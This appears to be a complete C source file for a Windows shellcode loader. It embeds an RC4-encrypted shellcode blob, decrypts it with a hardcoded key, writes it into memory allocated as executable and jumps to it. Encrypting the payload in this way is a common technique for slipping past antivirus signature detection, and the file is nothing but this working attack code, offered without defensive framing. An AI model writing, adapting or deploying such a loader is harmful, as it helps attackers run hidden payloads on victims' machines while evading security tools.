#include <windows.h>
#include "rc4.h"


void main() {

    // Encrypted shellcode. Output from "encrypt_shellcode.exe"
    unsigned char enc_shellcode[] = 
    "\xbb\x39\x0d\x7e\xa1\x73\xb6\x80\x35\x56\xc4\x77\xdd\x52"
    "\x08\xa2\x03\x6c\xc7\xb6\xb4\xb3\x03\x0a\xff\x4d\x97\x3e"
    "\x5c\xbc\x81\x1d\x17\xde\xbc\x03\xc3\xc6\xad\xda\x80\x31"
    "\x7e\x48\xff\x21\xe6\xf3\x3d\x0a\x6b\x9e\x94\x98\x8b\xef"
    "\xd6\x84\xc0\x3d\x24\xf7\xca\xe1\x0d\x10\x26\xf0\x77\xbf"
    "\xc5\x4f\x7d\x16\x20\x4f\xd9\x8f\x46\xc7\xba\xe1\x17\x4e"
    "\x01\x87\x9a\x67\x98\x9b\x7e\xa5\x82\x42\x84\x0f\xa7\x53"
    "\x97\x7d\x2d\x50\x6e\xb9\xa6\x93\xeb\x77\x5a\x98\xcd\xda"
    "\x86\x50\x96\x5e\xcb\xf6\x06\x14\xe2\x23\xbb\xdc\x2a\x57"
    "\xf9\xff\xb3\x0a\x57\x88\xc9\x45\xf0\x22\x55\xa3\xc2\xbe"
    "\x2b\xbd\x9c\x9a\xfb\xe5\xf2\x27\xbe\xa2\x69\x73\x8a\x82"
    "\x05\xfe\xf9\x61\xbd\x1c\x93\xcc\x59\x15\x47\xde\xcd\x51"
    "\x1a\xed\xfb\x73\x0e\x2c\xd8\xff\x23\x82\x6a\x5b\x74\x7e"
    "\x6c\xbe\xc1\xb6\xca\x63\x42\x09\x73\x40\xea\x47\xef\x33"
    "\xdb\x9e\x01\x58\xb0\x92\x39\xc2\x5f\x07\x29\xab\x90\x49"
    "\xc1\xfa\xb1\x23\x16\x6a\xc0";

    // Decrypts shellcode. Supply the encryption password. Here "Secret" was used to encrypt
    char* shellcode = rc4_encrypt_decrypt(enc_shellcode, sizeof(enc_shellcode), "Secret", false);

    // Allocate executable memory for the shellcode
    void *exec = VirtualAlloc(0, sizeof enc_shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    // Copy decrypted shellcode to allocated memory
    memcpy(exec, shellcode, sizeof enc_shellcode);
    
    // Execute shellcode
    ((void(*)())exec)();

}

